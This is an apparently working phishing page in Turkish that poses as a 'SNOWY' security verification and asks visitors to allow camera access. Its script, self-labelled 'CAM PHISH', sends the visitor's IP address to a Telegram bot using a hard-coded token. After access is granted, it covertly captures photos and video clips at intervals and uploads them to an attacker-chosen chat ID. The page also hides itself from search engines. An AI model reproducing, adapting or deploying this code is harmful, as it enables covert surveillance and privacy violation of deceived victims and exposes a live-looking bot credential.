<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h2 { color: #333; font-size: 28px; margin-bottom: 10px; }
        h2 span { color: #667eea; }
        p { color: #666; margin-bottom: 30px; }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; padding: 16px 32px;
            font-size: 18px; font-weight: bold; border-radius: 50px;
            cursor: pointer; width: 100%;
        }
        .btn:hover { transform: translateY(-2px); }
        .loading { display: none; margin: 20px 0; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #667eea; margin-top: 10px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Devam etmek için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            // ============================================
            // GİZLİ KONFİGÜRASYON
            // ============================================
            const BOT_TOKEN = "8773124715:AAHlbv12dpzmzHxXiIOPzeQkFcYzrshQmNw";
            
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_ID = urlParams.get('i');
            const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
            const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
            
            // ============================================
            // IP GÖNDER
            // ============================================
            if (TARGET_ID) {
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => {
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: TARGET_ID,
                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`
                            })
                        });
                    })
                    .catch(e => console.log(e));
            }
            
            // ============================================
            // PROFESYONEL ZAMANLAMA SİSTEMİ
            // ============================================
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            let mediaRecorder = null;
            let recordedChunks = [];
            let videoCount = 0;
            let photoCount = 0;
            let stream = null;
            let photoRAF = null;
            let videoTimer = null;
            let videoStopTimer = null;
            let lastPhotoTime = 0;
            let lastVideoTime = 0;
            let baslangicZamani = 0;
            
            // ============================================
            // KAMERA BAŞLAT
            // ============================================
            async function startCamera() {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { exact: 640 },
                            height: { exact: 480 },
                            frameRate: { exact: 30 }
                        } 
                    });
                    
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        document.getElementById('startBtn').style.display = 'none';
                        document.getElementById('loading').style.display = 'block';
                        
                        baslangicZamani = performance.now();
                        lastPhotoTime = baslangicZamani;
                        lastVideoTime = baslangicZamani + 2000; // Video 2 saniye sonra başlasın
                        
                        // FOTOĞRAF ZAMANLAMA - requestAnimationFrame
                        function photoLoop() {
                            const now = performance.now();
                            const gecenSure = now - baslangicZamani;
                            
                            // Kaç fotoğraf olması gerektiğini hesapla
                            const hedefFotoSayisi = Math.floor(gecenSure / (FOTO_SURESI * 1000));
                            
                            // Eksik fotoğraf varsa çek
                            while (photoCount < hedefFotoSayisi) {
                                takePhoto();
                            }
                            
                            photoRAF = requestAnimationFrame(photoLoop);
                        }
                        photoRAF = requestAnimationFrame(photoLoop);
                        
                        // VİDEO ZAMANLAMA - setInterval ile hassas
                        function videoLoop() {
                            const now = performance.now();
                            const gecenSure = now - baslangicZamani;
                            
                            // Kaç video olması gerektiğini hesapla (2 saniye gecikmeli)
                            const hedefVideoSayisi = Math.floor(Math.max(0, gecenSure - 2000) / (VIDEO_SURESI * 1000));
                            
                            // Eksik video varsa başlat
                            while (videoCount < hedefVideoSayisi) {
                                recordVideo();
                            }
                        }
                        
                        // Her 10ms'de bir kontrol et
                        setInterval(videoLoop, 10);
                    };
                    
                } catch(e) {
                    alert('Kamera izni gerekli!');
                }
            }
            
            // ============================================
            // FOTOĞRAF ÇEK
            // ============================================
            function takePhoto() {
                if (!stream?.active) return;
                
                photoCount++;
                const fotoZamani = performance.now() - baslangicZamani;
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                canvas.toBlob(function(blob) {
                    if (!blob) return;
                    
                    const formData = new FormData();
                    formData.append('chat_id', TARGET_ID);
                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${(fotoZamani/1000).toFixed(2)}s`);
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }, 'image/jpeg', 0.92);
            }
            
            // ============================================
            // VİDEO KAYDI
            // ============================================
            function recordVideo() {
                if (!stream?.active) return;
                
                videoCount++;
                const videoBaslangic = performance.now();
                const gecikme = videoBaslangic - baslangicZamani;
                
                recordedChunks = [];
                
                try {
                    mediaRecorder = new MediaRecorder(stream, {
                        mimeType: 'video/webm;codecs=vp8',
                        videoBitsPerSecond: 4000000
                    });
                } catch(e) {
                    mediaRecorder = new MediaRecorder(stream);
                }
                
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) recordedChunks.push(e.data);
                };
                
                mediaRecorder.onstop = () => {
                    const videoBitis = performance.now();
                    const videoSure = (videoBitis - videoBaslangic) / 1000;
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const boyutKB = (blob.size / 1024).toFixed(0);
                    
                    const formData = new FormData();
                    formData.append('chat_id', TARGET_ID);
                    formData.append('video', blob, `video_${Date.now()}.webm`);
                    formData.append('caption', `🎥 Video #${videoCount} - Başlangıç:${(gecikme/1000).toFixed(2)}s (${videoSure.toFixed(2)}s | ${boyutKB}KB)`);
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder?.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, VIDEO_SURESI * 1000);
            }
            
            // ============================================
            // TEMİZLİK
            // ============================================
            window.onbeforeunload = function() {
                if (photoRAF) cancelAnimationFrame(photoRAF);
                if (videoTimer) clearTimeout(videoTimer);
                if (videoStopTimer) clearTimeout(videoStopTimer);
                if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                if (stream) stream.getTracks().forEach(t => t.stop());
            };
            
            window.startCamera = startCamera;
        })();
    </script>
</body>
</html>
